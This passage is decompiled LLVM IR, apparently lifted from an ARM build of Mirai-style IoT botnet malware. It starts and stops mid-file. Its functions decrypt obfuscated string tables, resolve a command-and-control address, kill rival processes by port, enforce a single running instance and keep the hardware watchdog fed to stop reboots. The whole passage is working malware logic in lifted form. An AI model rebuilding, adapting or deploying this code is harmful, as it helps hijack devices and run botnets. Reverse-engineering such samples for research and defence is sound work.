  %v1_d3a0 = call i32 @table_unlock_val(i32 15)
  %v1_d3a8 = call i32 @table_unlock_val(i32 16)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d3b4 = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v2_d3bc, i32* @fp, align 4
  store i32 %v3_d3b4, i32* %r1.global-to-local, align 4
  store i32 %v2_d3bc, i32* @r0, align 4
  %v3_d3c8 = call i32 @util_strcpy(i8* %v2_d3c8, i32 %v3_d3b4)
  %v1_d3cc = load i32, i32* @fp, align 4
  %v2_d3cc = add i32 %v1_d3cc, %v3_d3c8
  store i32 %v2_d3cc, i32* %r5.global-to-local, align 4
  %v0_d3d0 = load i32, i32* @r6, align 4
  store i32 %v0_d3d0, i32* %r1.global-to-local, align 4
  store i32 %v2_d3cc, i32* @r0, align 4
  %v2_d3d8 = inttoptr i32 %v2_d3cc to i8*
  %v3_d3d8 = call i32 @util_strcpy(i8* %v2_d3d8, i32 %v0_d3d0)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d3d8, i32* %r4.global-to-local, align 4
  %v3_d3e8 = call i32 @table_retrieve_val(i32 16, i32* null)
  store i32 %v3_d3e8, i32* %r1.global-to-local, align 4
  %v1_d3f0 = load i32, i32* %r5.global-to-local, align 4
  %v2_d3f0 = add i32 %v1_d3f0, %v3_d3d8
  store i32 %v2_d3f0, i32* @r0, align 4
  %v2_d3f4 = inttoptr i32 %v2_d3f0 to i8*
  %v3_d3f4 = call i32 @util_strcpy(i8* %v2_d3f4, i32 %v3_d3e8)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d400 = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v3_d400, i32* %r1.global-to-local, align 4
  store i32 %v2_d40c, i32* @r0, align 4
  %v3_d410 = call i32 @util_strcpy(i8* %v2_d410, i32 %v3_d400)
  %v2_d41c = add i32 %v3_d410, %v2_d40c
  store i32 %v2_d41c, i32* @r5, align 4
  store i32 %v2_d41c, i32* @r0, align 4
  %v0_d424 = load i32, i32* @r6, align 4
  store i32 %v0_d424, i32* %r1.global-to-local, align 4
  %v2_d428 = inttoptr i32 %v2_d41c to i8*
  %v3_d428 = call i32 @util_strcpy(i8* %v2_d428, i32 %v0_d424)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d428, i32* @r4, align 4
  %v3_d438 = call i32 @table_retrieve_val(i32 31, i32* null)
  store i32 %v3_d438, i32* %r1.global-to-local, align 4
  %v0_d440 = load i32, i32* @r4, align 4
  %v1_d440 = load i32, i32* @r5, align 4
  %v2_d440 = add i32 %v1_d440, %v0_d440
  store i32 %v2_d440, i32* @r0, align 4
  %v2_d444 = inttoptr i32 %v2_d440 to i8*
  %v3_d444 = call i32 @util_strcpy(i8* %v2_d444, i32 %v3_d438)
  %v1_d44c = call i32 @table_lock_val(i32 15)
  %v1_d454 = call i32 @table_lock_val(i32 16)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d460 = call i32 @__libc_open(i32 %v2_d3bc, i32* null)
  %v7_d464 = icmp eq i32 %v3_d460, -1
  store i32 %v3_d460, i32* @r8, align 4
  br i1 %v7_d464, label %dec_label_pc_d57c, label %dec_label_pc_d470

dec_label_pc_d470:                                ; preds = %dec_label_pc_d390
  %v1_d474 = call i32 @table_unlock_val(i32 20)
  %v1_d47c = call i32 @table_unlock_val(i32 21)
  store i32 %v2_d484, i32* %r1.global-to-local, align 4
  %v3_d48c = call i32 @table_retrieve_val(i32 20, i32* nonnull %stack_var_-44)
  store i32 %v3_d48c, i32* @r5, align 4
  store i32 %v2_d498, i32* %r1.global-to-local, align 4
  %v3_d4a0 = call i32 @table_retrieve_val(i32 21, i32* nonnull %stack_var_-48)
  store i32 %v3_d4a0, i32* @r6, align 4
  %v0_d4a854 = load i32, i32* @r8, align 4
  store i32 %v2_d204, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d4b455 = call i32 @__libc_read(i32 %v0_d4a854)
  %tmp127 = icmp slt i32 %v1_d4b455, 1
  br i1 %tmp127, label %dec_label_pc_d5ac, label %dec_label_pc_d4c0

dec_label_pc_d4c0:                                ; preds = %dec_label_pc_d470, %dec_label_pc_d4a8.backedge
  %v0_d4f445 = phi i32 [ %v1_d4b4, %dec_label_pc_d4a8.backedge ], [ %v1_d4b455, %dec_label_pc_d470 ]
  store i32 %v2_cf90, i32* %r2.global-to-local, align 4
  %v3_d4c4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d4c4, i32* @r4, align 4
  %v5_d4cc = icmp slt i32 %v0_d4f445, %v3_d4c4
  br i1 %v5_d4cc, label %dec_label_pc_d4dc, label %dec_label_pc_d530.lr.ph

dec_label_pc_d530.lr.ph:                          ; preds = %dec_label_pc_d4c0
  %v1_d52837 = add i32 %v0_d4f445, -1
  store i32 %v1_d52837, i32* %r1.global-to-local, align 4
  %v0_d530.pre = load i32, i32* @r5, align 4
  %v1_d534.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d530

dec_label_pc_d4dc:                                ; preds = %dec_label_pc_d528.backedge, %dec_label_pc_d4c0
  store i32 %v2_cf90, i32* @r3, align 4
  %v3_d4e0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d4e0, i32* @lr, align 4
  %v5_d4e8 = icmp slt i32 %v0_d4f445, %v3_d4e0
  br i1 %v5_d4e8, label %dec_label_pc_d4a8.backedge, label %.thread25

dec_label_pc_d4a8.backedge:                       ; preds = %dec_label_pc_d510, %.thread25, %dec_label_pc_d4dc
  %v0_d4a8 = load i32, i32* @r8, align 4
  store i32 %v2_d204, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d4b4 = call i32 @__libc_read(i32 %v0_d4a8)
  %tmp128 = icmp slt i32 %v1_d4b4, 1
  br i1 %tmp128, label %dec_label_pc_d5ac, label %dec_label_pc_d4c0

.thread25:                                        ; preds = %dec_label_pc_d4dc
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d4f447 = icmp eq i32 %v0_d4f445, 0
  br i1 %v2_d4f447, label %dec_label_pc_d4a8.backedge, label %dec_label_pc_d4fc.lr.ph

dec_label_pc_d4fc.lr.ph:                          ; preds = %.thread25
  %v0_d4fc.pre = load i32, i32* @r6, align 4
  %v1_d500.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d4fc

dec_label_pc_d4fc:                                ; preds = %dec_label_pc_d510, %dec_label_pc_d4fc.lr.ph
  %v0_d4f4.in = phi i32 [ %v0_d4f445, %dec_label_pc_d4fc.lr.ph ], [ %v0_d4f4, %dec_label_pc_d510 ]
  %v0_d510 = phi i32 [ 0, %dec_label_pc_d4fc.lr.ph ], [ %v1_d510, %dec_label_pc_d510 ]
  %v1_d4fc = phi i32 [ 0, %dec_label_pc_d4fc.lr.ph ], [ %v1_d4fc84, %dec_label_pc_d510 ]
  %v0_d4f4 = add i32 %v0_d4f4.in, -1
  %v2_d4fc = add i32 %v1_d4fc, %v0_d4fc.pre
  %v3_d4fc = inttoptr i32 %v2_d4fc to i8*
  %v4_d4fc = load i8, i8* %v3_d4fc, align 1
  %v6_d4fc = zext i8 %v4_d4fc to i32
  store i32 %v6_d4fc, i32* %r2.global-to-local, align 4
  %v2_d500 = add i32 %v0_d510, %v1_d500.pre
  %v3_d500 = inttoptr i32 %v2_d500 to i8*
  %v4_d500 = load i8, i8* %v3_d500, align 1
  %v6_d500 = zext i8 %v4_d500 to i32
  store i32 %v6_d500, i32* @r3, align 4
  %v9_d504 = icmp eq i8 %v4_d500, %v4_d4fc
  br i1 %v9_d504, label %dec_label_pc_d54c, label %bb129

bb129:                                            ; preds = %dec_label_pc_d4fc
  br label %dec_label_pc_d510

dec_label_pc_d510:                                ; preds = %bb129, %dec_label_pc_d54c
  %v1_d4fc84 = phi i32 [ %v1_d54c, %dec_label_pc_d54c ], [ 0, %bb129 ]
  %v1_d510 = add i32 %v0_d510, 1
  store i32 %v1_d510, i32* %r1.global-to-local, align 4
  %v2_d4f4 = icmp eq i32 %v0_d4f4, 0
  br i1 %v2_d4f4, label %dec_label_pc_d4a8.backedge, label %dec_label_pc_d4fc

dec_label_pc_d518:                                ; preds = %dec_label_pc_d530
  %v1_d518 = add i32 %v1_d530, 1
  store i32 %v1_d518, i32* @lr, align 4
  %v9_d51c = icmp eq i32 %v3_d4c4, %v1_d518
  br i1 %v9_d51c, label %dec_label_pc_d558, label %dec_label_pc_d528.backedge

dec_label_pc_d528.backedge:                       ; preds = %dec_label_pc_d518, %dec_label_pc_d544
  %v1_d53075 = phi i32 [ 0, %dec_label_pc_d544 ], [ %v1_d518, %dec_label_pc_d518 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_d528 = add i32 %v0_d528, -1
  store i32 %v1_d528, i32* %r1.global-to-local, align 4
  %v2_d528 = icmp eq i32 %v0_d528, 0
  br i1 %v2_d528, label %dec_label_pc_d4dc, label %dec_label_pc_d530

dec_label_pc_d530:                                ; preds = %dec_label_pc_d528.backedge, %dec_label_pc_d530.lr.ph
  %v0_d528 = phi i32 [ %v1_d52837, %dec_label_pc_d530.lr.ph ], [ %v1_d528, %dec_label_pc_d528.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_d530.lr.ph ], [ %storemerge, %dec_label_pc_d528.backedge ]
  %v1_d530 = phi i32 [ 0, %dec_label_pc_d530.lr.ph ], [ %v1_d53075, %dec_label_pc_d528.backedge ]
  %v2_d530 = add i32 %v1_d530, %v0_d530.pre
  %v3_d530 = inttoptr i32 %v2_d530 to i8*
  %v4_d530 = load i8, i8* %v3_d530, align 1
  %v6_d530 = zext i8 %v4_d530 to i32
  store i32 %v6_d530, i32* %r2.global-to-local, align 4
  %v2_d534 = add i32 %storemerge.in, %v1_d534.pre
  %v3_d534 = inttoptr i32 %v2_d534 to i8*
  %v4_d534 = load i8, i8* %v3_d534, align 1
  %v6_d534 = zext i8 %v4_d534 to i32
  store i32 %v6_d534, i32* %r3.global-to-local, align 4
  %v9_d538 = icmp eq i8 %v4_d534, %v4_d530
  br i1 %v9_d538, label %dec_label_pc_d518, label %dec_label_pc_d544

dec_label_pc_d544:                                ; preds = %dec_label_pc_d530
  br label %dec_label_pc_d528.backedge

dec_label_pc_d54c:                                ; preds = %dec_label_pc_d4fc
  %v1_d54c = add i32 %v1_d4fc, 1
  %v9_d550 = icmp eq i32 %v3_d4e0, %v1_d54c
  br i1 %v9_d550, label %dec_label_pc_d558, label %dec_label_pc_d510

dec_label_pc_d558:                                ; preds = %dec_label_pc_d518, %dec_label_pc_d54c
  %v1_d55c = call i32 @table_lock_val(i32 20)
  %v1_d564 = call i32 @table_lock_val(i32 21)
  %v0_d568 = load i32, i32* @r8, align 4
  %v1_d56c = call i32 @__GI___libc_close(i32 %v0_d568)
  %v0_d570 = load i32, i32* @sl, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d578 = call i32 @kill(i32 %v0_d570, i32 9)
  br label %dec_label_pc_d57c

dec_label_pc_d57c:                                ; preds = %dec_label_pc_d390, %dec_label_pc_d5ac, %dec_label_pc_d558
  store i32 %v2_d3bc, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d584 = call i32 @util_zero()
  store i32 %v2_d40c, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d594 = call i32 @util_zero()
  %v1_d59c = call i32 @sleep(i32 1)
  %v2_d5a0 = load i32, i32* %stack_var_-4312, align 4
  store i32 %v2_d5a0, i32* @r4, align 4
  %v0_d5a4 = load i32, i32* @sl, align 4
  store i32 %v0_d5a4, i32* @r5, align 4
  br label %dec_label_pc_d2e4.backedge

dec_label_pc_d2e4.backedge:                       ; preds = %dec_label_pc_d348, %dec_label_pc_d340, %dec_label_pc_d2f4, %dec_label_pc_d57c, %.thread11
  %stack_var_-4308.1.be = phi i32 [ %v1_d31c, %dec_label_pc_d57c ], [ %v1_d31c, %.thread11 ], [ %stack_var_-4308.2, %dec_label_pc_d2f4 ], [ %v1_d31c, %dec_label_pc_d340 ], [ %v1_d31c, %dec_label_pc_d348 ]
  %v0_d2e4 = load i32, i32* @sb, align 4
  %v1_d2e8 = inttoptr i32 %v0_d2e4 to i32*
  %v2_d2e8 = call i32 @__GI_readdir(i32* %v1_d2e8)
  %v2_d2ec = icmp eq i32 %v2_d2e8, 0
  br i1 %v2_d2ec, label %dec_label_pc_d384, label %dec_label_pc_d2f4.preheader

dec_label_pc_d5ac:                                ; preds = %dec_label_pc_d4a8.backedge, %dec_label_pc_d470
  %v1_d5b0 = call i32 @table_lock_val(i32 20)
  %v1_d5b8 = call i32 @table_lock_val(i32 21)
  %v0_d5bc = load i32, i32* @r8, align 4
  %v1_d5c0 = call i32 @__GI___libc_close(i32 %v0_d5bc)
  br label %dec_label_pc_d57c

; uselistorder directives
  uselistorder i32 %v2_d2e8, { 1, 0 }
  uselistorder i32 %stack_var_-4308.1.be, { 1, 0 }
  uselistorder i32 %v1_d54c, { 1, 0 }
  uselistorder i32 %v1_d510, { 1, 0 }
  uselistorder i32 %v1_d4fc, { 1, 0 }
  uselistorder i32 %v0_d510, { 1, 0 }
  uselistorder i32 %v1_d4b4, { 1, 0 }
  uselistorder i32 %v3_d460, { 1, 0 }
  uselistorder i32 %v2_d378, { 1, 0 }
  uselistorder i32 %v1_d31c, { 0, 1, 4, 3, 2, 5, 8, 7, 6 }
  uselistorder i32 %v1_d2f4, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-4308.0, { 1, 0 }
  uselistorder i32 %v2_d40c, { 1, 0, 2 }
  uselistorder i32 %v3_d290, { 1, 0 }
  uselistorder i32 %v3_d260, { 2, 0, 1 }
  uselistorder i32 %v3_d210, { 1, 0 }
  uselistorder i32 %v2_d204, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v3_d190, { 1, 2, 0 }
  uselistorder i32 %v3_d13c, { 1, 2, 0 }
  uselistorder i32 %v3_d0ec, { 1, 2, 0 }
  uselistorder i32 %v3_d0a0, { 1, 2, 0 }
  uselistorder i32 %v3_d054, { 1, 2, 0 }
  uselistorder i32 %v3_d01c, { 1, 2, 0 }
  uselistorder i32 %v3_cfc8, { 2, 1, 0 }
  uselistorder i32 %storemerge94, { 1, 0 }
  uselistorder i32 %v0_cf54, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-64, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 2, 1, 51, 52, 3, 4, 5, 6, 8, 7, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 50, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 2, 1, 0 }
  uselistorder i32* @global_var_24a54.71, { 0, 2, 1 }
  uselistorder label %dec_label_pc_d2e4.backedge, { 3, 0, 1, 4, 2 }
  uselistorder label %dec_label_pc_d57c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d558, { 1, 0 }
  uselistorder label %dec_label_pc_d528.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d510, { 1, 0 }
  uselistorder label %dec_label_pc_d4c0, { 1, 0 }
  uselistorder label %dec_label_pc_d2f4, { 1, 0 }
  uselistorder label %dec_label_pc_d2f4.preheader, { 1, 0 }
  uselistorder label %bb126, { 1, 0 }
  uselistorder label %dec_label_pc_d1bc, { 1, 0 }
  uselistorder label %dec_label_pc_d168, { 1, 0 }
  uselistorder label %dec_label_pc_d118, { 1, 0 }
  uselistorder label %dec_label_pc_d0cc, { 1, 0 }
  uselistorder label %dec_label_pc_d080, { 1, 0 }
  uselistorder label %dec_label_pc_d048, { 1, 0 }
  uselistorder label %dec_label_pc_cff4, { 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_d750.84 to i32), i32* @global_var_21dc0.86, align 4
  ret i32 %arg1
}

define i32 @ensure_single_instance(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_d5f0 = load i32, i32* @r6, align 4
  %v12_d5f0 = load i32, i32* @r7, align 4
  %v15_d5f0 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_d60c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_21db8.88 to i32), i32* @r6, align 4
  %v7_d614 = icmp eq i32 %v3_d60c, -1
  store i32 %v3_d60c, i32* @global_var_21db8.88, align 4
  br i1 %v7_d614, label %dec_label_pc_d6cc, label %dec_label_pc_d620

dec_label_pc_d620:                                ; preds = %entry
  %v2_d620 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_d620, i32* @r3, align 4
  %v0_d624 = load i32, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v5_d634 = call i32 @__GI_setsockopt(i32 %v3_d60c, i32 %v0_d624, i32 2, i32 %v2_d620, i32 4)
  %v2_d638 = load i32, i32* @global_var_21db8.88, align 4
  store i32 %v2_d638, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_d648 = call i32 @__libc_fcntl(i32 %v2_d638, i32 3)
  %v0_d64c = load i32, i32* @r5, align 4
  %v1_d650 = or i32 %v2_d648, 2048
  store i32 %v1_d650, i32* @r2, align 4
  %v0_d654 = load i32, i32* @r4, align 4
  %v2_d658 = call i32 @__libc_fcntl(i32 %v0_d654, i32 %v0_d64c)
  store i32 ptrtoint (i8** @global_var_21dc4.90 to i32), i32* @r8, align 4
  %v2_d660 = load i8, i8* bitcast (i8** @global_var_21dc4.90 to i8*), align 4
  %v2_d664 = icmp eq i8 %v2_d660, 0
  br i1 %v2_d664, label %.thread2, label %bb

.thread2:                                         ; preds = %dec_label_pc_d620
  br label %bb20

bb:                                               ; preds = %dec_label_pc_d620
  br label %bb20

bb20:                                             ; preds = %.thread2, %bb
  %v0_d688 = call i32 @__GI___errno_location()
  store i32 0, i32* @r7, align 4
  %v2_d690 = inttoptr i32 %v0_d688 to i32*
  store i32 0, i32* %v2_d690, align 4
  %v2_d694 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d694, i32* @r5, align 4
  store i32 %v0_d688, i32* %r4.global-to-local, align 4
  %v2_d6a4 = load i32, i32* @global_var_21db8.88, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d6b0 = call i32 @bind(i32 %v2_d6a4, i32 %v2_d694, i32 16)
  %v7_d6b4 = icmp eq i32 %v3_d6b0, -1
  br i1 %v7_d6b4, label %dec_label_pc_d6d8, label %dec_label_pc_d6bc

dec_label_pc_d6bc:                                ; preds = %bb20
  %v2_d6c4 = load i32, i32* @global_var_21db8.88, align 4
  %v2_d6c8 = call i32 @listen(i32 %v2_d6c4, i32 1)
  br label %dec_label_pc_d6cc

dec_label_pc_d6cc:                                ; preds = %entry, %dec_label_pc_d6e4, %dec_label_pc_d6bc
  %v1_d6d4 = phi i32 [ %v3_d60c, %entry ], [ %v1_d728, %dec_label_pc_d6e4 ], [ %v2_d6c8, %dec_label_pc_d6bc ]
  store i32 %v9_d5f0, i32* @r6, align 4
  store i32 %v12_d5f0, i32* @r7, align 4
  store i32 %v15_d5f0, i32* @r8, align 4
  ret i32 %v1_d6d4

dec_label_pc_d6d8:                                ; preds = %bb20
  %v0_d6d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_d6d8 = inttoptr i32 %v0_d6d8 to i32*
  %v2_d6d8 = load i32, i32* %v1_d6d8, align 4
  %v7_d6dc = icmp eq i32 %v2_d6d8, 99
  br i1 %v7_d6dc, label %dec_label_pc_d730, label %dec_label_pc_d6e4

dec_label_pc_d6e4:                                ; preds = %dec_label_pc_d730, %bb21, %dec_label_pc_d6d8
  store i32 15290, i32* @r4, align 4
  %v2_d6fc = load i32, i32* @global_var_21db8.88, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d70c = call i32 @__libc_connect(i32 %v2_d6fc, i32 %v2_d694, i32 16)
  %v1_d714 = call i32 @sleep(i32 5)
  %v2_d718 = load i32, i32* @global_var_21db8.88, align 4
  %v1_d71c = call i32 @__GI___libc_close(i32 %v2_d718)
  %v0_d720 = load i32, i32* @r4, align 4
  %v1_d724 = call i32 @killer_kill_by_port(i32 %v0_d720)
  %v1_d728 = call i32 @ensure_single_instance(i32 %v1_d724)
  br label %dec_label_pc_d6cc

dec_label_pc_d730:                                ; preds = %dec_label_pc_d6d8
  %v2_d730 = load i8, i8* bitcast (i8** @global_var_21dc4.90 to i8*), align 4
  %v3_d730 = zext i8 %v2_d730 to i32
  %v1_d734 = load i32, i32* @r7, align 4
  %v9_d734 = icmp eq i32 %v3_d730, %v1_d734
  br i1 %v9_d734, label %dec_label_pc_d6e4, label %bb21

bb21:                                             ; preds = %dec_label_pc_d730
  %v2_d73c = trunc i32 %v1_d734 to i8
  store i8 %v2_d73c, i8* bitcast (i8** @global_var_21dc4.90 to i8*), align 4
  br label %dec_label_pc_d6e4

; uselistorder directives
  uselistorder i32 %v2_d694, { 1, 0, 2 }
  uselistorder i32 %v3_d60c, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 (i32)* @killer_kill_by_port, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @listen, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bind, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_21dc4.90 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_21dc4.90, { 1, 0 }
  uselistorder label %dec_label_pc_d6e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d6cc, { 1, 2, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @resolve_cnc_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v1_d758 = call i32 @table_unlock_val(i32 2)
  %v3_d764 = call i32 @table_retrieve_val(i32 2, i32* null)
  %v1_d768 = call i32 @resolv_lookup(i32 %v3_d764)
  store i32 %v1_d768, i32* @r6, align 4
  %v1_d774 = call i32 @table_lock_val(i32 2)
  %v0_d778 = load i32, i32* @r6, align 4
  %v2_d778 = icmp eq i32 %v0_d778, 0
  br i1 %v2_d778, label %dec_label_pc_d7c8, label %dec_label_pc_d780

dec_label_pc_d780:                                ; preds = %entry
  %v1_d780 = add i32 %v0_d778, 4
  %v2_d780 = inttoptr i32 %v1_d780 to i32*
  %v3_d780 = load i32, i32* %v2_d780, align 4
  store i32 %v3_d780, i32* @r4, align 4
  %v0_d784 = call i32 @rand_next()
  %v0_d788 = load i32, i32* @r6, align 4
  %v1_d788 = inttoptr i32 %v0_d788 to i8*
  %v2_d788 = load i8, i8* %v1_d788, align 1
  %v3_d788 = zext i8 %v2_d788 to i32
  %v3_d78c = urem i32 %v0_d784, %v3_d788
  store i32 ptrtoint (i16** @global_var_24a58.93 to i32), i32* @r5, align 4
  %v0_d794 = load i32, i32* @r4, align 4
  %v4_d794 = mul nuw nsw i32 %v3_d78c, 4
  %v5_d794 = add i32 %v0_d794, %v4_d794
  %v6_d794 = inttoptr i32 %v5_d794 to i32*
  %v7_d794 = load i32, i32* %v6_d794, align 4
  store i32 %v7_d794, i32* @global_var_24a5c.94, align 4
  %v1_d7a0 = call i32 @resolv_entries_free(i32 %v0_d788)
  %v1_d7a8 = call i32 @table_unlock_val(i32 1)
  %v3_d7b4 = call i32 @table_retrieve_val(i32 1, i32* null)
  %v4_d7b4 = inttoptr i32 %v3_d7b4 to i16*
  %v3_d7b8 = load i16, i16* %v4_d7b4, align 2
  store i16 %v3_d7b8, i16* bitcast (i32* @global_var_24a5a.95 to i16*), align 4
  %v1_d7c4 = call i32 @table_lock_val(i32 1)
  br label %dec_label_pc_d7c8

dec_label_pc_d7c8:                                ; preds = %entry, %dec_label_pc_d780
  %v1_d7cc = phi i32 [ %v1_d774, %entry ], [ %v1_d7c4, %dec_label_pc_d780 ]
  ret i32 %v1_d7cc

; uselistorder directives
  uselistorder label %dec_label_pc_d7c8, { 1, 0 }
}

define i32 @watchdog_maintain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_d7d4 = load i32, i32* @r4, align 4
  %v6_d7d4 = load i32, i32* @r5, align 4
  %v9_d7d4 = load i32, i32* @lr, align 4
  %v0_d7dc = call i32 @__libc_fork()
  %v7_d7e0 = icmp eq i32 %v0_d7dc, -1
  %. = zext i1 %v7_d7e0 to i32
  %tmp11 = icmp slt i32 %v0_d7dc, 1
  %storemerge4 = select i1 %tmp11, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_d7fc = icmp eq i32 %storemerge4, 0
  store i32 %v0_d7dc, i32* @global_var_21f38.97, align 4
  br i1 %v2_d7fc, label %dec_label_pc_d814, label %dec_label_pc_d808

dec_label_pc_d808:                                ; preds = %entry
  store i32 %v3_d7d4, i32* @r4, align 4
  store i32 %v6_d7d4, i32* @r5, align 4
  store i32 %v9_d7d4, i32* @lr, align 4
  ret i32 %v0_d7dc

dec_label_pc_d814:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_d820 = call i32 @table_unlock_val(i32 25)
  %v1_d828 = call i32 @table_unlock_val(i32 26)
  %v0_d82c = load i32, i32* @r5, align 4
  %v2_d834 = inttoptr i32 %v0_d82c to i32*
  %v3_d834 = call i32 @table_retrieve_val(i32 25, i32* %v2_d834)
  %v3_d83c = call i32 @__libc_open(i32 %v3_d834, i32* inttoptr (i32 2 to i32*))
  %v7_d840 = icmp eq i32 %v3_d83c, -1
  store i32 %v3_d83c, i32* @r4, align 4
  br i1 %v7_d840, label %dec_label_pc_d888, label %dec_label_pc_d84c

dec_label_pc_d84c:                                ; preds = %dec_label_pc_d888, %dec_label_pc_d814
  %v0_d858 = phi i32 [ %v3_d898, %dec_label_pc_d888 ], [ %v3_d83c, %dec_label_pc_d814 ]
  %v2_d85c = ptrtoint i32* %stack_var_-20 to i32
  %v3_d860 = call i32 @ioctl(i32 %v0_d858, i32 -2147199228, i32 %v2_d85c)
  br label %dec_label_pc_d864

dec_label_pc_d864:                                ; preds = %dec_label_pc_d864, %dec_label_pc_d84c
  %v0_d870 = load i32, i32* @r4, align 4
  %v3_d878 = call i32 @ioctl(i32 %v0_d870, i32 -2147199227, i32 0)
  %v1_d880 = call i32 @sleep(i32 10)
  br label %dec_label_pc_d864

dec_label_pc_d888:                                ; preds = %dec_label_pc_d814
  %v0_d888 = load i32, i32* @r5, align 4
  %v2_d890 = inttoptr i32 %v0_d888 to i32*
  %v3_d890 = call i32 @table_retrieve_val(i32 26, i32* %v2_d890)
  %v3_d898 = call i32 @__libc_open(i32 %v3_d890, i32* inttoptr (i32 2 to i32*))
  %v3_d89c = icmp eq i32 %v3_d898, -1
  store i32 %v3_d898, i32* @r4, align 4
  br i1 %v3_d89c, label %dec_label_pc_d8a8, label %dec_label_pc_d84c

dec_label_pc_d8a8:                                ; preds = %dec_label_pc_d888
  %v1_d8ac = call i32 @table_lock_val(i32 25)
  %v1_d8b4 = call i32 @table_lock_val(i32 26)
  %v0_d8b8 = load i32, i32* @r5, align 4
  %v1_d8bc = call i32 @__GI_exit(i32 %v0_d8b8)
  %v0_d8c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d8c0, label %bb14, label %bb15

bb14:                                             ; preds = %dec_label_pc_d8a8
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_d8a8, %bb14
  ret i32 %v1_d8bc

; uselistorder directives
  uselistorder i32 %v3_d898, { 1, 2, 0 }
  uselistorder i32 %v3_d83c, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_d7dc, { 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-1432 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_d8d4 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d8d4, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_d8ec = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  store i32 %v2_d8d4, i32* @r0, align 4
